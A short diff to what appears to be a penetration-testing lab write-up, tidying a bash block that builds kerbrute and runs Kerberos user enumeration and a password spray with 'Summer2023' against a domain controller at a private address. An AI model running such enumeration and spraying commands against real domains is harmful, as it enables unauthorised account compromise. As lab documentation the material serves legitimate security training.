@@ -29,11 +29,8 @@ make linux
 ```bash
 cd dist
 ls -la
-
 ./kerbrute_linux_arm64
-
 ./kerbrute_linux_arm64 userenum -d nagoya-industries.com --dc 192.168.186.21 ~/Nagoya/users
-
 ./kerbrute_linux_arm64 passwordspray -d nagoya-industries.com --dc 192.168.186.21 ~/Nagoya/users Summer2023
 ```
 
